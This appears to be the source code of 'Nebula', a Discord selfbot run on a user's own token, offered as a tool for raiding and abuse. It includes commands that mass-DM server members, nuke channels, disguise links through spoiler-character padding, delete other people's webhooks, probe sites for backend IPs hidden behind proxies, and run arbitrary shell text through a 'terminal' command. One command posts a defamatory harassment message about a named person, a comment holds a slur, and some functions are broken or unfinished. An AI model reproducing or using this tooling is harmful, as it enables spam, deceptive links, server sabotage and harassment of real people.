# -*- coding: utf-8 -*-

version = "2.10"
import asyncio, platform, random, psutil, ctypes, itertools, socket, colorama, getpass, sys, json, subprocess, discord
import os, base64, requests, pytube, hashlib, threading, math, aiohttp, datetime, pythonping, ipapi, time, numpy, pypresence
from discord_webhook import DiscordWebhook, DiscordEmbed
from discord.ext import commands
from bs4 import BeautifulSoup
from discord.embeds import Embed
from discord.utils import get
from colorama import Fore, Style
from pytube import YouTube
from pypresence import Presence


ctypes.windll.kernel32.SetConsoleTitleW('Nebula')
prefix = "/"
client = discord.Client()
client = commands.Bot(
    command_prefix=prefix,
    self_bot=True
)
client.remove_command('help') 


                
username = getpass.getuser()
hostname = socket.gethostname()
OS = platform.platform()
t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)

with open('config.json') as f:
    config = json.load(f)
title = config.get('title')
footer = config.get('footer')
author = config.get('author')
token = config.get('token')
t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
start_time = datetime.datetime.utcnow()

done = False


def restart_program():
    python = sys.executable
    os.execl(python, python, "\"{}\"".format(sys.argv[0]))


def Clear():
     os.system("cls")

MAGENTA = '\u001b[38;5;196m'
Light_MAGENTA = "\033[0m\033[1;31m"
Green = '\u001b[32m'
Yellow = '\u001b[38;5;226m'
Blue = '\u001b[34m'
Light_Blue = "\033[0m\033[1;34m"
Pink = '\u001b[35m'
White = '\033[97m'
Purple = '\033[38;5;89m'
Light_Grey = '\033[37m'
Dark_Grey = '\033[90m'
 
Clear()


def banner():
    mem = psutil.virtual_memory()
    cpu_per = round(psutil.cpu_percent(),1)
    mem_per = round(psutil.virtual_memory().percent,1)
    Servers = len(client.guilds)    
    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Version 2.1 | Connected as: {client.user.name}#{client.user.discriminator}')
    os.system('cls')
    Servers = len(client.guilds)
    friends = len(client.user.friends)
    r = f'{Fore.MAGENTA}'
    w = f'{Fore.WHITE}'
    print(f'''
{w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
{w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .

                                    {r}Nebula Loaded{w}!                              {r}charge{w}#{r}1993
                                  {w}═════════════════════════════════════════════════════════════
     
                                       {r}███{w}╗{r}   ██{w}╗{r}███████{w}╗{r}██████{w}╗ {r}██{w}╗   {r}██{w}╗{r}██{w}╗      {r}█████{w}╗ 
                                       {r}████{w}╗  {r}██{w}║{r}██{w}╔════╝{r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}╗
                                       {r}██{w}╔{r}██{w}╗ {r}██{w}║{r}█████{w}╗  {r}██████{w}╔╝{r}██{w}║   {r}██{w}║{r}██{w}║     {r}███████{w}║
                                       {r}██{w}║╚{r}██{w}╗{r}██{w}║{r}██{w}╔══╝  {r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}║
                                       {r}██{w}║ ╚{r}████{w}║{r}███████{w}╗{r}██████{w}╔╝╚{r}██████{w}╔╝{r}███████{w}╗{r}██{w}║  {r}██{w}║
                                       {w}╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
     
                                                      {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
                                                      {r}Guilds:  {w}[{r}{Servers}{w}]
                                                      {r}Friends: {w}[{r}{friends}{w}]
                                  {w}═════════════════════════════════════════════════════════════
                                                   
'''+Fore.RESET)
                                                   
def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)



def loading():
    os.system('cls')
    r = f'{Fore.MAGENTA}'
    w = f'{Fore.WHITE}'
    print(f'''
{w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
{w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .                            
                                 
                                 
                                 
                                                  Welcome To {Fore.MAGENTA} Nebula{White}. 
                                                    {Fore.WHITE}[{Fore.MAGENTA}Final Edtion{Fore.WHITE}]                            
    
    ''')
    time.sleep(0.6)

mem = psutil.virtual_memory()
cpu_per = round(psutil.cpu_percent(),1)
mem_per = round(psutil.virtual_memory().percent,1)

@client.event
async def on_connect():
    log()
    mem = psutil.virtual_memory()
    cpu_per = round(psutil.cpu_percent(),1)
    mem_per = round(psutil.virtual_memory().percent,1)
    Servers = len(client.guilds)    
    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Version 2.1 | Connected')
    os.system('cls')
    Servers = len(client.guilds)
    friends = len(client.user.friends)
    Clear()
    r = f'{Fore.MAGENTA}'
    w = f'{Fore.WHITE}'
    print(f'''
{w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
{w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .

                               {r}Nebula Loaded{w}!                             {r}  Version{w} {r}2.1.
                             {w}═════════════════════════════════════════════════════════════
  
                                  {r}███{w}╗{r}   ██{w}╗{r}███████{w}╗{r}██████{w}╗ {r}██{w}╗   {r}██{w}╗{r}██{w}╗      {r}█████{w}╗ 
                                  {r}████{w}╗  {r}██{w}║{r}██{w}╔════╝{r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}╗
                                  {r}██{w}╔{r}██{w}╗ {r}██{w}║{r}█████{w}╗  {r}██████{w}╔╝{r}██{w}║   {r}██{w}║{r}██{w}║     {r}███████{w}║
                                  {r}██{w}║╚{r}██{w}╗{r}██{w}║{r}██{w}╔══╝  {r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}║
                                  {r}██{w}║ ╚{r}████{w}║{r}███████{w}╗{r}██████{w}╔╝╚{r}██████{w}╔╝{r}███████{w}╗{r}██{w}║  {r}██{w}║
                                  {w}╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
  
                                                 {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
                                                 {r}Guilds:  {w}[{r}{Servers}{w}]
                                                 {r}Friends: {w}[{r}{friends}{w}]
                             {w}═════════════════════════════════════════════════════════════
                                                   
'''+Fore.RESET)

@client.event
async def on_message_edit(before, after):
    await client.process_commands(after)


@client.command()
async def system(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*System Resources*", description=f"```Memory - {mem_per}%\n\nCPU - {cpu_per}%\n```", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def help(ctx):
    await ctx.message.delete() 
    embed=discord.Embed(title=f"*Nebula Help Commands*", description=f"**General**\nShows General Help Commands\n\n**Tools**\nShows all Tools\n\n**Exploits**\nShows All Discord Exploits\n\n**Raid**\nShows all raid tools\n\n**Status**\n Shows all Status Commands\n", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def status(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula Status Commands*", description=f"**Game**\nShows you're playing a game\n\n**Listen**\nShows you're listening to a song\n\n**Streaming**\nShows you're streaming on twitch\n\n**Watching**\nShows you're watching something\n",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


def google(search):
    URL = (f'https://google.com/search?q={search}')
    headers = {'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36'}
    request = requests.get(URL, headers=headers)
    if request.status_code == 200:
        soup = BeautifulSoup(request.content, 'html.parser')
        results = []
        for i in soup.find_all('div', {'class' : 'yuRUbf'}):
            link = i.find_all('a')
            links = link[0]['href']
            results.append(links)
    try:
        return(results)
    except Exception as e:
        print('Error getting results from Google')
        pass


@client.command()
async def raid(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula Raid Commands*", description=f"**Illegal**\nDestroys the server\n\n**DMAll**\nDM's every person in the server\n\n**MassBan**\nBans everyone in the server\n\n**MassKick**\nKicks everyone in the server\n\n**MassRole**\nMass creates roles\n\n**MassChannel\n**Creates a LOT of channels\n\n**DelChannels**\nDeletes every channel in the server\n\n**DelRoles**\nDeletes every role in the server",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)
 

@client.command()
async def exploits(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula Exploit Commands*", description=f"**Cloudssp**\nFinds the backend server of a website that is running cpanel\n\n**WebSpoof**\nwebspoof <LINK1> <LINK2>\n\n**UnVerify**\nUnverifys given token",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def project(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f" **Project Link** ", description=f"https://github.com/fansigns/nebula-selfbot/", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_thumbnail(url='https://images-ext-1.discordapp.net/external/O9v-PlVnlyl0qpUzQxMUAEItJ4Zb92A9C1trxLH676U/%3Fs%3D400%26v%3D4/https/avatars0.githubusercontent.com/u/74613350')
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def udpflood(ctx, host, time, port):
    await ctx.message.delete()
    

@client.command()
async def dmall(ctx, *, dmall):
    await ctx.message.delete()
    embed=discord.Embed(title=f" **Attempting to DM {ctx.guild.member_count} users** ", description=f"With the message of **{dmall}**", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)
    for user in ctx.guild.members:
        try:
                await user.send(dmall)
                await asyncio.sleep(3)
        except:
                print(f"[{Fore.MAGENTA}!{Fore.WHITE}]{Fore.MAGENTA} Error messaging {Fore.WHITE}{Fore.MAGENTA}[{Fore.WHITE}{user.name}{Fore.MAGENTA}]")


@client.command()
@commands.has_permissions(manage_channels=True)
async def nuke(ctx):
    
    channel = ctx.channel
    channel_position = channel.position
    
    new_channel = await channel.clone()
    await channel.delete()
    await new_channel.edit(position=channel_position, sync_permissions=True)
    embed=discord.Embed(title=f" **Nuked!** ", description=f"```This channel was nuked by Nebula Selfbot!```", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10,new_channel=new_channel)

@client.command()
@commands.has_permissions(ban_members=True)
async def test(ctx):
    embed=discord.Embed(title=f" **Nuked!** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_footer(text=f'{footer} ')
    embed.set_thumbnail(url='https://giphygifs.s3.amazonaws.com/media/HhTXt43pk1I1W/200.gif')
    await ctx.channel.delete(reason="nuke")
    channel = await ctx.channel.clone(reason="nuke")
    await channel.send(embed=embed, delete_after=10)

@client.command()
async def general(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula General Commands*", description=f"**Purges**\nPurges a certain amount of messages\n\n**D**\nPurges all the messages you sent in server\n\n**chnick**\nChanges given user to given nick (MUST HAVE PERMS)\n\n**MD5**\nEncodes given message in MD5\n\n**SHA256**\nEncodes given message in SHA256\n\n**B64ENCODE**\nEncode given message in Base64\n\n**B64DECODE**\nDecodes given Base64 String\n\n**Covid**\nGets current covid stats in the United States\n\n**Ban**\nBans given user\n\n**Unban**\nUnbans given user\n\n**MR**\nMass Reacts on messages\n\n",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def unverify(ctx, _token): 
    await ctx.message.delete()
    headers = {'Authorization': _token}
    requests.get(f'https://discord.com/api/v6/guilds/0/members', headers=headers)

@client.command()
async def everyone(ctx, *, message=None):
    await ctx.message.delete()
    mention = '\n\n'.join(role.mention for role in ctx.message.guild.roles)
    await ctx.message.channel.send(mention)


@client.command()
async def poll(ctx, *, question: str):
    await ctx.message.delete()
    embed=discord.Embed(title=f" **Poll!** ", description=f"```{question}```", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

    try:
        await ctx.message.delete()
    except:
        pass
    if ctx.guild.id == 207943928018632705:
        # Essential :sexthumb:
        yes_thumb = discord.utils.get(
            ctx.guild.emojis, id=287711899943043072)
        no_thumb = discord.utils.get(
            ctx.guild.emojis, id=291798048009486336)
    else:
        yes_thumb = "👍"
        no_thumb = "👎"
    await embed.add_reaction(yes_thumb)
    await embed.add_reaction(no_thumb)


@client.command()
async def tools(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula Tools*", description=f"**SubScan**\nScans given website's subdomains\n\n**PhoneLookup**\nLooks up given phone number\n\n**Firewall**\nScans for a firewall on given site\n\n**PortScan**\nPort Scans given site\n\n**Ping**\nPings given site\n\n**Locate**\nFinds Geo-Location of given IP\n\n**Headers**\n Gets given website's headers\n\n**Host2IP**\n Grabs ip from given website\n\n**GetHost**\nTraces given IP to a website\n\n**WebSS**\nScreenShots given website\n\n**Dictionary**\nLooks up given word on Urban Dictionary\n\n**UserInfo**\nGets info from given user\n\n**TokenInfo**\nGrabs info from given token\n\n**Webhook**\nDeletes given webhook\n\n**Spanish**\nTranslates Word/Sentence to spanish\n\n**Russian**\nTranslates Word/Sentence to Russian",color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def webspoof(ctx, link1, link2):
    await ctx.message.delete()
    await ctx.send (f"<https://{link1}>||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||https://{link2}")

@client.command()
async def invitespoof(ctx, link1, link2):
    await ctx.message.delete()
    await ctx.send (f"{link1}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||{link2}")

@client.command()
async def lookup(ctx, *, ip: str):
    ip_info = ipapi.location(ip=ip)    
    await ctx.message.delete()
    embed = discord.Embed(title=f"**{ip}** lookup!", description='',color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.add_field(name="ORG", value=f"{ip_info['org']}", inline=False)
    embed.add_field(name="ASN", value=f"{ip_info['asn']}", inline=False)
    embed.add_field(name="Region", value=f"{ip_info['region']}", inline=False)
    embed.add_field(name="Country", value=f"{ip_info['country_name']}", inline=False)
    embed.add_field(name="City", value=f"{ip_info['city']}", inline=False)
    embed.add_field(name="Timezone", value=f"{ip_info['timezone']}", inline=False)
    embed.add_field(name="Language", value=f"{ip_info['languages']}", inline=False)
    embed.add_field(name="Currency", value=f"{ip_info['currency']}", inline=False)
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def blockbypass(ctx, message, client_id):
    await ctx.message.delete()
    token = getToken
    client_id = client
    headers = {'Authorization': token}
    res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json={'recipient_id': client_id})
    return res.json().get('id')
    channel_id = _get_channel_id(client_id)
    return requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': message})



@client.command()
async def download(ctx, video):
    await ctx.message.delete()
    yt = YouTube(video)
    ys = yt.streams.get_highest_resolution()
    yt.download()
    embed=discord.Embed(title=f" **Downloaded {yt.title}** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
 
@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@client.command()
async def terminal(ctx, *, text):
    await ctx.message.delete()
    output = subprocess.getoutput(f"{text}")
    embed=discord.Embed(title=f" **Terminal** ", description=f"```{output}```", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def cloudssp(ctx, site):
    await ctx.message.delete()
    url = sites = site
    x = requests.get(''+url+'//mailman/listinfo/mailman') 
    if x.status_code == 404:
        embed=discord.Embed(title=f" **Seems like this site is not vulnerable** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
        
        embed.set_footer(text=f'{footer} ')
        await ctx.send(embed=embed,delete_after=10)

    else:
        arg = site
        with requests.get(arg, stream=True) as rsp:
                ip, port = rsp.raw._connection.sock.getpeername()
        output = subprocess.getoutput("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST")
        embed=discord.Embed(title=f" **CloudSSP** ", description=f"URL: {arg}\n Protected IP: **{ip}**\n Protected Port: **{port}**\n **Backend**:\n```{output}\n```", color=0xbf00ff, timestamp=ctx.message.created_at)
        
        embed.set_footer(text=f'{footer} ')
        await ctx.send(embed=embed,delete_after=10)

        
@client.command(pass_context=True)
async def chnick(ctx, member: discord.Member, *, nick):
    await ctx.message.delete()
    await member.edit(nick=nick)
#def cloudssp():
   # @client.command()
    #async def cfbypass(ctx, site):
       # await ctx.message.delete()
        #embed=discord.Embed(title=f" **Check Console!** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
        #await ctx.send(embed=embed,delete_after=5)

    
   # url = sites = site
   # x = requests.get(url+'/mailman/listinfo/mailman')
    

   # if x.status_code == 404:
    #          print(f'{Fore.MAGENTA}Seems like this site is not vulnerable.')
  #            
   # else:
  #        print(f"{Fore.WHITE}Looks like we found something!")
       #   print("")
  #        print(f"{Fore.YELLOW}IP/Domain links found:{Fore.WHITE}")
   #       print("")

#          os.system("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST")

@client.command()
async def webhook(ctx, webhook):
    await ctx.message.delete()
    try:
        statuscode1 = requests.get(f"{webhook}").status_code
        if statuscode1 ==404:
            embed=discord.Embed(title="**Invalid Webhook!**",color=0xbf00ff, timestamp=ctx.message.created_at)
            embed.set_footer(text=f'{footer} ')
            await ctx.send(embed=embed,delete_after=10)

        elif statuscode1 ==200:
            info = requests.get(f"{webhook}")
            WebName = info.json()['name']
            WebChannelID = info.json()['channel_id']
            WebGuildID = info.json()['guild_id']
            WebID = info.json()['id']
            Avatar = info.json()['avatar']
            requests.delete(f"{webhook}")
            statuscode = requests.get(f"{webhook}").status_code
            if statuscode ==200:
                embed=discord.Embed(title="**Error!**",color=0xbf00ff, timestamp=ctx.message.created_at)
                embed.set_footer(text=f'{footer} ')
                await ctx.send(embed=embed,delete_after=10)

            else:
                embed=discord.Embed(title="__**Deleted!**__",color=0xbf00ff, timestamp=ctx.message.created_at)
                embed.add_field(name="**Name**", value=f"{WebName}", inline=True)
                embed.add_field(name="**Channel ID**", value=f"{WebChannelID}", inline=True)
                embed.add_field(name="**Server ID**", value=f"{WebGuildID}", inline=False)
                embed.set_image(url=f"https://cdn.discordapp.com/avatars/{WebID}/{Avatar}")                          
                embed.set_footer(text=f'{footer} ')
                await ctx.send(embed=embed,delete_after=10)

    except:
        print(f"{Style.BRIGHT}{Fore.WHITE}[{Style.BRIGHT}{Fore.MAGENTA}!]{Fore.WHITE} Invalid Webhook")     
     
@client.command()
async def reload(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f" **Nebula Selfbot** ", description=f"Reloading Now!\n\n```Creator - charge#1993```", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)
    restart_program()
@client.command()
async def md5(ctx, *, message):
    await ctx.message.delete()
    result = hashlib.md5(f"{message}".encode("utf-8")).hexdigest()
    embed=discord.Embed(title=f" MD5 Encode For {message} ", description=f"{result}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def sha256(ctx, *, message):
    await ctx.message.delete()
    str = f'{message}'
    result = hashlib.sha256(str.encode()).hexdigest()
    embed=discord.Embed(title=f" SHA256 Encode For {message} ", description=f"{result}", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def typing(ctx):
    await ctx.message.delete()
    headers = {'Authorization': token}
    requests.post(f'https://discordapp.com/api/v6/channels/{ctx.message.channel.id}/typing', headers=headers)

@client.command()
async def cls(ctx):
        await ctx.message.delete()
        Clear()
        banner()

@client.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    client.command_prefix = prefix
    embed=discord.Embed(title=f" **Prefix changed to {prefix}** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def streaming(ctx, url,* ,message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,url=url)
    await client.change_presence(activity=stream)


@client.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message,)) 

@client.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    if (
      isinstance(ctx.channel, discord.DMChannel) 
      or isinstance(ctx.channel, discord.GroupChannel) or 
      ctx.message.guild.unavailable
    ):
      return
    server = ctx.message.guild
    online = 0
    for user in server.members:
      if str(user.status) in ['online', 'idle', 'dnd']:
        online += 1
    users = []
    for user in server.members:
      users.append(f'{user.name}#{user.discriminator}')
    users.sort()
    all_users = '\n'.join(users)
    text_channels = len([x for x in server.channels if type(x) == discord.channel.TextChannel])
    voice_channels = len([y for y in server.channels if type(y) != discord.channel.TextChannel])

    b = "\n".join([f'{m.name}#{m.discriminator}' for m in server.premium_subscribers])
    boosters = f'```{b}```' if b else 'No Boosters'
    embed=discord.Embed(title=f" **{server.name}'s Info** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.add_field(name="**Owner**", value=f"{ctx.guild.owner}", inline=True)
    embed.add_field(name="**Name**", value=f"{server.name}", inline=True)
    embed.add_field(name="**ID**", value=f"{server.id}", inline=True)
    embed.add_field(name="**Members**", value=f"{server.member_count}", inline=True)
    embed.add_field(name="**Online**", value=f"{online}", inline=True)
    embed.add_field(name="**Text Channels**", value=f"{text_channels}", inline=True)
    embed.add_field(name="**Region**", value=f"{server.region}", inline=True)
    embed.add_field(name="**Verification**", value=f"{server.verification_level}", inline=True)
    embed.add_field(name="**Highest Role**", value=f"{server.roles[-1]}", inline=True)
    embed.add_field(name="**Role Count**", value=f"{len(server.roles)}", inline=True)
    embed.add_field(name="**Emoji Count**", value=f"{len(server.emojis)}", inline=True)
    embed.add_field(name="**Created**", value=f"{server.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S')}", inline=True)
    embed.add_field(name="**Boosters**", value=f"{boosters}", inline=True)
    embed.set_thumbnail(url=server.icon_url)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def ping(ctx, *, ip: str):
    await ctx.message.delete()
    result = pythonping.ping(ip, verbose=False)
    embed=discord.Embed(title="**Ping Results**", description=f"Returning Ping Results For: {ip}", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.add_field(name="Is Live", value=result.success(), inline=False)
    embed.add_field(name="Output", value='```%s```' % "\n".join(str(x) for x in result), inline=False)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def av(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    embed=discord.Embed(title=str(user) + "'s Profile Picture", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url=user.avatar_url)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def vi(ctx):
    await ctx.message.delete()
    #http://femboy.host/uploads/5363db86-1ece-475a-b86f-c0b31373108e/LI1G2Ak6.png
    #https://images-ext-2.discordapp.net/external/ouZK4T1IjzO1MF4ZnMN1mfBd85Z1GKmoCzW8hfFnS3E/http/i-hate.niggers.lol/uploads/0f18d1ce-6692-4104-bbb0-d6e96b56b92e/0vNw3hnM.png
    embed=discord.Embed(title="**vi**",description="vi condones child porn and is mad because her server got banned for a legitimate reason!", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url='https://cdn.discordapp.com/attachments/784623962038468608/786008132253646848/image0.png')
    embed.set_thumbnail(url='https://cdn.discordapp.com/avatars/715581783260921976/a_2a2c88ccb3e84563d88b4f6ed4fb1b2c.gif?size=1024')
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed)


@client.command()
async def sav(ctx):
    await ctx.message.delete()
    server = ctx.message.guild
    embed=discord.Embed(title=f" **{server.name}'s Icon** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url=server.icon_url)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def sba(ctx):
    await ctx.message.delete()
    server = ctx.message.guild
    embed=discord.Embed(title=f" **{server.name}'s Banner** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
    embed.set_image(url=server.banner_url)
    
    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def game(ctx, *, message):
  await ctx.message.delete()
  game = discord.Game(name=message)
  await client.change_presence(activity=game)

# -- API COMMANDS -- #

@client.command()
async def phonelookup(ctx, phone):
    await ctx.message.delete()
